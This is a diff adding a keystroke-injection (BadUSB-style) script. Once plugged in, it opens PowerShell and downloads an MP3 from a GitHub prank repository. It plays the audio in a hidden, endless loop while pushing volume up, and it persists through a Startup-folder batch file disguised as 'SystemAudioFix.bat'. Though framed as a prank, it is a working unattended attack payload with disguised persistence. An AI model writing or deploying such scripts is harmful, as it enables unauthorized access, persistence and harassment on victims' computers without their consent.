@@ -1,0 +1,77 @@
+DELAY 5000
+
+GUI r
+
+DELAY 700
+
+STRING powershell
+
+ENTER
+
+DELAY 2000
+
+STRING $Url = "https://raw.githubusercontent.com/jsfael/rbp-prank/main/rick%20roll/music.mp3"
+
+ENTER
+
+DELAY 200
+
+STRING $MusicDir = Join-Path $HOME "Music"
+
+ENTER
+
+DELAY 200
+
+STRING $LocalPath = Join-Path $MusicDir "audio.mp3"
+
+ENTER
+
+DELAY 200
+
+STRING $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+
+ENTER
+
+STRING $BatPath = Join-Path $StartupPath "SystemAudioFix.bat"
+
+ENTER
+
+DELAY 200
+
+STRING if (!(Test-Path $MusicDir)) { New-Item -ItemType Directory -Path $MusicDir }
+
+ENTER
+
+DELAY 500
+
+STRING Invoke-WebRequest -Uri $Url -OutFile $LocalPath
+
+ENTER
+
+DELAY 7000
+
+STRING $MusicCommand = "Add-Type -As presentationCore; `$m=New-Object System.Windows.Media.MediaPlayer; `$m.Open('$LocalPath'); while(`$m.NaturalDuration.HasTimeSpan -eq `$false){Sleep 1}; `$m.Volume=1; `$w=New-Object -Com WScript.Shell; while(1){ `$m.Play(); do { `$w.SendKeys([char]175); Sleep -m 500 } while (`$m.Position -lt `$m.NaturalDuration.TimeSpan); `$m.Position=[TimeSpan]::Zero }"
+
+ENTER
+
+DELAY 500
+
+STRING Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile", "-Command", $MusicCommand
+
+ENTER
+
+DELAY 500
+
+STRING $BatContent = "@echo off`nstart /min powershell.exe -WindowStyle Hidden -NoProfile -Command `"$MusicCommand`"`nexit"
+
+ENTER
+
+DELAY 200
+
+STRING Set-Content -Path $BatPath -Value $BatContent
+
+ENTER
+
+STRING exit
+
+ENTER
